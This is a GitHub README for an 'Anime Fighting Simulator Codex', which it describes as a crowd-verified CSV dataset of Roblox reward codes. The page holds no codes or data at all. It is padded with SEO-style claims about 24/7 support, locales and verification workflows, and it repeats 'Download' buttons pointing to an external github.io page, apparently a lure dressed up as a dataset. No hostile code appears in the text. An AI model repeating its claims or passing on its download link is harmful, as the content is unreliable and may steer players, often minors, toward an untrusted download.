![preview](https://raw.githubusercontent.com/christianphilip229-art/anime-fighting-simulator-codex/main/hero_b007.svg)
[![Download](https://raw.githubusercontent.com/christianphilip229-art/anime-fighting-simulator-codex/main/run_2031.svg)](https://christianphilip229-art.github.io/anime-fighting-simulator-codex/)

# 🌸 Anime Fighting Simulator Codex — A Living Atlas of Redeemable Rewards

[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Dataset](https://img.shields.io/badge/Dataset-CSV-blueviolet)]()
[![Status: Maintained](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen)]()
[![Community Driven](https://img.shields.io/badge/Community-Driven-orange)]()
[![Multilingual](https://img.shields.io/badge/Docs-EN%20%7C%20ES%20%7C%20PT%20%7C%20FR-informational)]()
[![Responsive](https://img.shields.io/badge/UI-Fully%20Responsive-9cf)]()
[![Support](https://img.shields.io/badge/Support-24%2F7-success)]()

---

## 🌀 Foreword — Why This Atlas Exists

Every so often, a game becomes more than a game. **Anime Fighting Simulator** on Roblox is one of those rare digital ecosystems where millions of players hunt for every sliver of advantage: a hidden code, a rotational blessing, a limited-time boon tucked into a developer's tweet. These small strings of letters — typed once, redeemed once — can shift the trajectory of an entire progression arc.

Most repositories that collect these strings are little more than unsorted walls of text. They rot within weeks. The code lists go stale. Nobody documents *when* a code was last validated, *who* confirmed it, or *why* the community believes it still works. Players waste time. Trust erodes.

**Anime Fighting Simulator Codex** was built to be the antidote. It is not a scraped paste dump. It is a *cartographic project* — a map of the known and the unknown. Every entry is either **documented** (validated recently and traceable to a source of truth) or **undocumented** (rumored, deprecated, or awaiting re-verification). The CSV structure makes it trivially portable: a script, a Discord bot, a personal notebook, or a fan wiki can all consume the same authoritative file and stay in sync.

Think of this repository as a lighthouse for players navigating the fog of expired codes. It doesn't just tell you what shines — it tells you what *used to* shine, and why the light went out.

---

[![Download](https://raw.githubusercontent.com/christianphilip229-art/anime-fighting-simulator-codex/main/run_2031.svg)](https://christianphilip229-art.github.io/anime-fighting-simulator-codex/)

## 📚 Table of Contents

1. [What This Repository Is](#-what-this-repository-is)
2. [Project Philosophy — Documented vs Undocumented](#-project-philosophy--documented-vs-undocumented)
3. [Core Feature Set](#-core-feature-set)
4. [The CSV Schema, Explained Like a Story](#-the-csv-schema-explained-like-a-story)
5. [Multilingual Community Support](#-multilingual-community-support)
6. [Responsive Access Across Devices](#-responsive-access-across-devices)
7. [Daily and 24/7 Support Rhythm](#-daily-and-247-support-rhythm)
8. [SEO and Discoverability Notes](#-seo-and-discoverability-notes)
9. [Use Cases and Integrations](#-use-cases-and-integrations)
10. [Data Integrity and Verification Workflow](#-data-integrity-and-verification-workflow)
11. [Roadmap for 2026](#-roadmap-for-2026)
12. [FAQ](#-faq)
13. [Contributing](#-contributing)
14. [Disclaimer](#-disclaimer)
15. [License](#-license)
16. [Final Download Anchor](#-final-download-anchor)

---

## 🎯 What This Repository Is

This project is a **Codex** — a curated, version-controlled CSV dataset of reward codes associated with the Roblox experience *Anime Fighting Simulator*. It is simultaneously:

- A **historical record** of codes that have existed since the early days of the experience.
- A **live status board** that distinguishes actively redeemable strings from retired ones.
- A **community artifact** where contributors attach nuance, notes, and regional observations.
- A **portable data file** — plain, comma-separated, human-readable, and machine-friendly.

It is *not* a script, an executor, or any form of automation against Roblox's systems. It is a dataset. Nothing more, nothing less. Its power comes from clarity, not from cleverness.

The Codex speaks in a calm, documented voice. It never promises. It only records.

---

## 🧭 Project Philosophy — Documented vs Undocumented

Two columns sit at the heart of the Codex:

- **`status_documented`** — This entry has been verified by at least one crowd-sourced check within the trailing 30-day window, or it is directly traceable to a developer announcement archived in this repo.
- **`status_undocumented`** — This entry is known to the community but lacks recent confirmation. It may be expired, regionally restricted, or simply forgotten. It lives here so history is never erased.

This duality is the soul of the project. Instead of aggressively purging old codes (a common failure mode of lesser lists), the Codex preserves them as *archaeological layers*. A player in 2026 can look back and see what was redeemable in 2023 — a small but genuine piece of internet history.

---

## ⚙️ Core Feature Set

- 🗂️ **CC0-style CSV dataset** — structured, portable, and drily literal.
- 🧾 **Dual-state status tracking** — documented and undocumented codes coexist without shame.
- 🌍 **Multilingual support** — notes and headers translated into Spanish, Portuguese, French, and English.
- 📱 **Responsive UI in tooling** — any companion viewer built on top of this data renders cleanly from phone to ultrawide.
- 🕰️ **Historical timestamps** — each row carries a first-seen and last-verified marker.
- 🔁 **Rotation awareness** — seasonal and event-specific codes are grouped with an `event_tag`.
- 🤝 **Community verification workflow** — discussed, diffed, and merged transparently.
- 📖 **Human-readable schema** — no base64, no obfuscation, no nonsense.
- 📡 **24/7 support cadence** — maintainers respond across time zones so the data never sleeps alone.
- 🧠 **Original tone** — even boring fields like `reward_type` get described in a way you'll actually remember.

---

## 🧬 The CSV Schema, Explained Like a Story

Each row is a small character in a larger narrative. Here is what each column means, told plainly:

- **`code`** — The string itself. The spell. The thing typed into the redeem box.
- **`reward_summary`** — A short human description of what the code grants. Chikara, yen, boosts, cosmetic items.
- **`reward_type`** — Canonical category (currency, stat boost, cosmetic, hybrid, unknown).
- **`first_seen_iso`** — The ISO 8601 date the code first appeared in public observation.
- **`last_verified_iso`** — The most recent date a contributor confirmed the code still worked.
- **`status`** — Either `documented` or `undocumented`. The heart of the Codex.
- **`event_tag`** — Which seasonal or milestone event the code belongs to (e.g., `summer`, `anniversary`, `none`).
- **`region_notes`** — Any regional caveats. Some codes are rumored to behave differently across shards.
- **`source_kind`** — Whether the code was observed from a developer post, a community announcement, or an in-game notification.
- **`notes`** — Free-form text. The most human column. Often contains stories.

Every column is documented in a companion file, `SCHEMA.md`, so that anyone building on the dataset understands it without guessing.

---

## 🌐 Multilingual Community Support

The Codex does not assume English. Headers and the most common reward descriptions are available in:

- 🇬🇧 **English**
- 🇪🇸 **Spanish**
- 🇵🇹 **Portuguese (BR/PT)**
- 🇫🇷 **French**

Localized files live under `locales/` and follow the same column names, translated for readability. The canonical CSV remains language-neutral in structure but English-first in content, so downstream tools can join localized views without breaking. Additional locales are welcomed — the goal is a dataset that greets every player in the language they dream in.

---

## 📱 Responsive Access Across Devices

Whether you read the Codex on a six-inch phone during a bus ride or on a three-monitor workstation at 3 a.m., the data renders cleanly:

- CSV viewers built on top of this repo are expected to be **fluid**.
- Column widths are stable and predictable.
- Long `notes` fields wrap gracefully; nothing is truncated.
- Companion tooling follows a **mobile-first** grid philosophy.

Responsiveness is not a feature here — it is a *courtesy*. Data that cannot be read on the device you own is data you don't really have.

---

## 🛎️ Daily and 24/7 Support Rhythm

Codes expire. Communities sleep. The Codex tries to bridge that gap with a round-the-clock rhythm:

- Maintainers are distributed across multiple time zones.
- Issues opened at any hour are triaged within a working day.
- Verification reports are batched and applied in rolling merges.
- A monthly summary post is assembled for those who prefer a slow read over a firehose.

This is what we mean by 24/7-adjacent support: not a chat hotline, but a steady heartbeat that never quite stops.

---

## 🔍 SEO and Discoverability Notes

The Codex is written with a deliberate awareness that players search before they ask. Phrases such as *Anime Fighting Simulator reward codes dataset*, *documented code list Roblox*, and *verified code status CSV* appear organically in prose — never stuffed, never forced. The goal is discoverability as a public good:

- Descriptive headings.
- Semantic, keyword-rich intros.
- Plain-text clarity that search engines reward.
- Honest status labels that prevent clickbait-style disappointment.

If you are building a fan site, a wiki, or a personal tracker, this repo aims to be the kind of result you actually want to land on.

---

## 🧰 Use Cases and Integrations

The Codex is deliberately unopinionated about *how* it is used. Common patterns include:

- 🤖 **Community Discord bots** that ping a channel when a row flips from `undocumented` to `documented`.
- 📊 **Fan wikis** that pull the CSV nightly and render a table.
- 🧑‍💻 **Personal trackers** assembled in spreadsheets by individual players.
- 🗓️ **Historical dashboards** charting how many codes go live per event.
- 📚 **Research notebooks** examining redemption cadence over the years.

Because it is a plain file, it slots into whatever stack you already use. No SDK. No lock-in. No dependency hell.

---

## 🛡️ Data Integrity and Verification Workflow

Trust is earned slowly and lost quickly. The Codex approach:

1. **Submission** — A contributor opens a pull request with a new row or an updated `last_verified_iso`.
2. **Independent check** — A second contributor attempts redemption on a fresh account in a safe environment and reports back.
3. **Merge or annotate** — If confirmed, the row moves to `documented`. If contested, `notes` gains a paragraph.
4. **Rolling audit** — Every 30 days, rows older than the verification window revert to `undocumented` until re-checked.

Nothing is deleted. Everything is timestamped. The dataset remembers.

---

## 🗺️ Roadmap for 2026

- 🧾 **Q1 2026** — Publish `SCHEMA.md` and full locale parity.
- 📈 **Q2 2026** — Release a lightweight, dependency-free CSV viewer as a separate repo.
- 🌍 **Q3 2026** — Expand locales to German, Italian, and Japanese.
- 🕰️ **Q4 2026** — Ship the "Codex Timeline"—a scrollable history of every code ever observed.
- 🤝 **Ongoing** — Continue the 24/7 verification rhythm and maintain transparent contributor logs.

The roadmap is posted openly and revised publicly. Suggestions are welcome and treated as first-class input.

---

## ❓ FAQ

**Is this a tool that interacts with the game?**
No. It is a dataset. It has no runtime presence inside any Roblox experience.

**Why keep expired codes at all?**
Because history has value. Erased data is lost forever; archived data can be revisited.

**Who maintains this?**
A small group of volunteers coordinated through the issue tracker. The project deliberately avoids attributing rows to individuals, in the spirit of shared stewardship.

**Can I reuse this in my own project?**
Yes — under the terms of the MIT license described below.

---

## 🤝 Contributing

Contributions are the lifeblood of the Codex. Useful contributions include:

- New verified rows with full column data.
- Updates to `last_verified_iso` with a note on how you checked.
- Corrections to reward descriptions.
- New locale files.
- Documentation improvements.

Contributed rows should always respect the documented/undocumented distinction. Being wrong is fine; being *quietly* wrong is not.

---

## ⚠️ Disclaimer

This repository is an **unofficial, community-run dataset**. It is not affiliated with, endorsed by, or sponsored by the developers or publishers of *Anime Fighting Simulator* or Roblox Corporation. All code strings, reward descriptions, and related names remain the property of their respective owners.

Data is provided **as-is**, in 2026, without warranty of any kind — express or implied — including but not limited to merchantability, fitness for a particular purpose, or non-infringement. Verification is performed on a best-effort basis by volunteers. Reward availability may change at any moment for reasons entirely outside the control of this project. Users are responsible for complying with the terms of service of any platform they use.

---

## 📜 License

This project is released under the **MIT License**.
You may read the full license text at the canonical source:

License: https://opensource.org/licenses/MIT

Copyright (c) 2026 — the contributors of the Anime Fighting Simulator Codex.

Permission is hereby granted, in the spirit of the MIT License, to any person obtaining a copy of this dataset and associated documentation files, to deal in the data without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the data, subject to the conditions set forth in the full MIT text linked above.

---

## 🔗 Final Download Anchor

[![Download](https://raw.githubusercontent.com/christianphilip229-art/anime-fighting-simulator-codex/main/run_2031.svg)](https://christianphilip229-art.github.io/anime-fighting-simulator-codex/)